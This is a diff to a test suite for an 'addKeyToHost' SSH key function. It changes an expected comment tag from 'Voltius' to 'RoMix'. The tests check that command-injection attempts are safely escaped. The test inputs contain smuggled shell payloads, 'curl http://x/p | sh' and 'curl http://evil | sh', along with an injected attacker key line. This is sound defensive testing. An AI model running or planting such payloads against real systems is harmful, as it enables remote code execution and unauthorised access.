@@ -90,7 +90,7 @@ describe("addKeyToHost", () => {
     // Each embedded quote is escaped (close-quote, escaped quote, reopen-quote)
     // rather than closing the argument, so the whole payload stays inside one
     // shell-quoted string instead of becoming a second command.
-    expect(command).toContain("'# it'\\''; curl http://x/p | sh; echo '\\'' Key by Voltius'");
+    expect(command).toContain("'# it'\\''; curl http://x/p | sh; echo '\\'' Key by RoMix'");
   });
 
   it("throws on a multi-line public key instead of shipping it, and never calls sshExecCommand", async () => {
@@ -103,7 +103,7 @@ describe("addKeyToHost", () => {
     const injectedKey = { id: "k1", name: "x\nssh-ed25519 AAAA…attacker" } as any;
     await addKeyToHost({ sshKey: injectedKey, connection });
     const { command } = sshExecCommand.mock.calls[0][0] as any;
-    expect(command).toContain("'# x ssh-ed25519 AAAA…attacker Key by Voltius'");
+    expect(command).toContain("'# x ssh-ed25519 AAAA…attacker Key by RoMix'");
     expect(command).not.toMatch(/# x\nssh-ed25519/);
   });
 
@@ -150,7 +150,7 @@ describe("addKeyToHost", () => {
     const hostileName = { replace: () => "'; curl http://evil | sh; echo '", toString: () => "plain" };
     await addKeyToHost({ sshKey: { id: "k1", name: hostileName } as any, connection });
     const { command } = sshExecCommand.mock.calls[0][0] as any;
-    expect(command).toContain("'# plain Key by Voltius'");
+    expect(command).toContain("'# plain Key by RoMix'");
     expect(command).not.toContain("curl http://evil");
   });
 
